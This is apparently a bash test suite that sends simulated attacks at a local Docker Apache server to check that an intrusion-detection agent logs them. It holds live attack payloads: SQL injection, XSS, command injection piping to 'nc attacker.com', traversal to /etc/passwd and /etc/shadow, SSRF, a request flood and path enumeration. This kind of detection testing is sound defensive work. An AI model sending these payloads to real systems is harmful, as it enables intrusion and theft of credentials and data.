#!/bin/bash
# Sentinel Agent - Attack Simulation Test Suite
# Run from Ubuntu host: bash test_attacks.sh
# Target: Apache running inside Docker on port 80

TARGET="http://localhost:80"
SSH_TARGET="localhost"
SSH_PORT="22"

echo "=================================================="
echo "  Sentinel Agent - Attack Simulation Test Suite"
echo "=================================================="
echo "Target: $TARGET"
echo "Watch logs with: docker-compose logs -f sentinel-agent"
echo "=================================================="
echo ""

# Wait between attacks so logs are readable
DELAY=3

# --------------------------------------------------
echo "[1/10] SQL Injection"
echo "--------------------------------------------------"
curl -s "$TARGET/search?q=admin'%20UNION%20SELECT%20*%20FROM%20users--" > /dev/null
curl -s "$TARGET/login" --data "username=admin'%20OR%20'1'='1&password=test" > /dev/null
curl -s "$TARGET/products?id=1%20DROP%20TABLE%20users" > /dev/null
echo "Sent 3 SQL injection requests"
sleep $DELAY

# --------------------------------------------------
echo ""
echo "[2/10] Cross-Site Scripting (XSS)"
echo "--------------------------------------------------"
curl -s "$TARGET/search?q=<script>alert('xss')</script>" > /dev/null
curl -s "$TARGET/comment?text=<img%20src=x%20onerror=alert(1)>" > /dev/null
curl -s "$TARGET/profile?name=<script>document.cookie</script>" > /dev/null
curl -s "$TARGET/input?val=javascript:alert('xss')" > /dev/null
echo "Sent 4 XSS requests"
sleep $DELAY

# --------------------------------------------------
echo ""
echo "[3/10] Command Injection"
echo "--------------------------------------------------"
curl -s "$TARGET/ping?host=localhost;cat%20/etc/passwd" > /dev/null
curl -s "$TARGET/exec?cmd=\$(whoami)" > /dev/null
curl -s "$TARGET/run?input=test|nc%20attacker.com%2080" > /dev/null
curl -s "$TARGET/api?q=\`id\`" > /dev/null
echo "Sent 4 command injection requests"
sleep $DELAY

# --------------------------------------------------
echo ""
echo "[4/10] Directory Traversal"
echo "--------------------------------------------------"
curl -s "$TARGET/file?path=../../etc/passwd" > /dev/null
curl -s "$TARGET/download?file=..%2F..%2F..%2Fetc%2Fshadow" > /dev/null
curl -s "$TARGET/read?name=../../../../proc/self/environ" > /dev/null
curl -s "$TARGET/view?doc=..\\..\\windows\\system32\\cmd.exe" > /dev/null
echo "Sent 4 directory traversal requests"
sleep $DELAY

# --------------------------------------------------
echo ""
echo "[5/10] SSRF (Server-Side Request Forgery)"
echo "--------------------------------------------------"
curl -s "$TARGET/proxy?url=http://127.0.0.1:8000/api/health" > /dev/null
curl -s "$TARGET/fetch?target=file:///etc/passwd" > /dev/null
curl -s "$TARGET/load?src=http://0.0.0.0/internal" > /dev/null
curl -s "$TARGET/api?callback=gopher://localhost:6379" > /dev/null
echo "Sent 4 SSRF requests"
sleep $DELAY

# --------------------------------------------------
echo ""
echo "[6/10] Automated Scanner Simulation"
echo "--------------------------------------------------"
curl -s -A "sqlmap/1.5.2" "$TARGET/" > /dev/null
curl -s -A "Nikto/2.1.5" "$TARGET/" > /dev/null
curl -s -A "Mozilla/5.0 zgrab/0.x" "$TARGET/" > /dev/null
curl -s -A "python-requests/2.28.0" "$TARGET/admin" > /dev/null
curl -s -A "Nuclei - Open-source project" "$TARGET/" > /dev/null
echo "Sent 5 scanner-signature requests"
sleep $DELAY

# --------------------------------------------------
echo ""
echo "[7/10] DDoS Simulation (60 rapid requests)"
echo "--------------------------------------------------"
echo "Sending 60 rapid requests..."
for i in $(seq 1 60); do
    curl -s "$TARGET/" > /dev/null &
done
wait
echo "Sent 60 concurrent requests"
sleep $DELAY

# --------------------------------------------------
echo ""
echo "[8/10] SSH Brute Force"
echo "--------------------------------------------------"
echo "Simulating SSH brute force via log injection..."
# Inject fake SSH brute force lines directly into auth.log
docker exec sentinel-agent bash -c "
for i in \$(seq 1 10); do
    echo \"\$(date '+%b %d %H:%M:%S') server sshd[\$\$]: Failed password for root from 203.0.113.99 port 4444\$i ssh2\" >> /var/log/auth.log
    sleep 0.1
done
echo 'Injected 10 SSH brute force log lines'
"
sleep $DELAY

# --------------------------------------------------
echo ""
echo "[9/10] Directory Enumeration (Scanner behavior)"
echo "--------------------------------------------------"
for path in /admin /wp-admin /phpmyadmin /.env /config.php /backup.sql \
            /shell.php /test.php /.git/config /robots.txt /sitemap.xml \
            /api/v1/users /api/v1/admin /dashboard /login /register; do
    curl -s "$TARGET$path" > /dev/null
done
echo "Sent 15 directory enumeration requests"
sleep $DELAY

# --------------------------------------------------
echo ""
echo "[10/10] CSRF + Session attacks"
echo "--------------------------------------------------"
curl -s -H "Referer: null" "$TARGET/transfer" --data "amount=9999&to=attacker" > /dev/null
curl -s -H "Origin: null" "$TARGET/settings" --data "email=hacker@evil.com" > /dev/null
curl -s -H "Cookie: session=invalid_hijacked_token_12345" "$TARGET/profile" > /dev/null
echo "Sent 3 CSRF/session attack requests"
sleep $DELAY

# --------------------------------------------------
echo ""
echo "=================================================="
echo "  All 10 attack types simulated"
echo "=================================================="
echo ""
echo "Check results:"
echo "  Live logs:   docker-compose logs -f sentinel-agent"
echo "  Dashboard:   http://localhost:8501"
echo "  Attack tab:  Look at [ATTACKS] Attack Patterns tab"
echo ""
echo "Expected to see in logs:"
echo "  [ATTACK] SQL Injection     | Severity: HIGH"
echo "  [ATTACK] Stored XSS        | Severity: HIGH"
echo "  [ATTACK] Command Injection | Severity: CRITICAL"
echo "  [ATTACK] Directory Traversal | Severity: HIGH"
echo "  [ATTACK] SSRF              | Severity: CRITICAL"
echo "  [ATTACK] Automated Scanner | Severity: HIGH"
echo "  [ATTACK] DDoS Attack       | Severity: CRITICAL"
echo "  [ATTACK] SSH Brute Force   | Severity: HIGH"
echo "=================================================="
